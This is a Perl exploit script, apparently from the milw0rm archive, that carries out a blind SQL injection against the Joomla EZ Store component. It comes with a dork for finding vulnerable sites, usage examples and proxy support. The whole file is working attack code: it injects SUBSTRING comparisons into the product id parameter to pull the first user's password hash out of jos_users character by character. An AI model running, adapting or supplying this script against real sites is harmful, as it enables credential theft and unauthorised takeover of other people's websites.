#!/usr/bin/perl
#Note:Sometimes you have to change the regexp to  viewcategory/catid,".$cid."
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
  print "                                                                  \n";
    print "   ################################################################\n";
  print "   #   Joomla Component EZ Store Blind SQL Injection Exploit      #\n";
  print "   #   Author:His0k4 [ALGERIAN HaCkeR]                            #\n";
  print "   #                                                              #\n";
  print "   #   Conctact: His0k4.hlm[at]gamil.com                          #\n";
  print "   #   Greetz:   All friends & muslims HacKeRs                    #\n";
  print "   #   Greetz2:  http://www.dz-secure.com                         #\n";
  print "   #                                                              #\n";
  print "   #   Dork:    inurl:com_ezstore                                 #\n";
  print "   #   Usage:   perl ezstore.pl host path <options>               #\n";
  print "   #   Example: perl ezstore.pl www.host.com /joomla/ -p 11 -c 2  #\n";
  print "   #                                                              #\n";
  print "   #   Options:                                                   #\n";
  print "   #     -t    Valid  procuct id                                  #\n";
  print "   #     -c    Category value of the following  product id        #\n";
  print "   ################################################################\n";

  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $cid     = $ARGV[2];
my $pid     = $ARGV[3];

my %options = ();
GetOptions(\%options, "c=i", "x=s", "p=i");

print "[~] Exploiting...\n";

if($options{"c"})
{
  $cid = $options{"c"};
}

if($options{"p"})
{
  $pid = $options{"p"};
}

syswrite(STDOUT, "[~] MD5-Hash: ", 14);

for(my $i = 1; $i <= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f && $h <= 57)
  {
    if(istrue2($host, $path, $cid, $pid, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f && $h <= 122)
    {
      if(istrue2($host, $path, $cid, $pid, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print "\n[~] Exploiting done\n";

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $cid   = shift;
  my $pid   = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent->new;
  my $query = "http://".$host.$path."index.php?option=com_ezstore&Itemid=1&func=detail&id=".$pid." and (SUBSTRING((SELECT password FROM jos_users LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
 
  if($options{"x"})
  {
    $ua->proxy('http', "http://".$options{"x"});
  }
 
  my $resp = $ua->get($query);
  my $content = $resp->content;
  my $regexp = "viewcategory&catid=".$cid."";
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }

}

# milw0rm.com [2008-08-03]
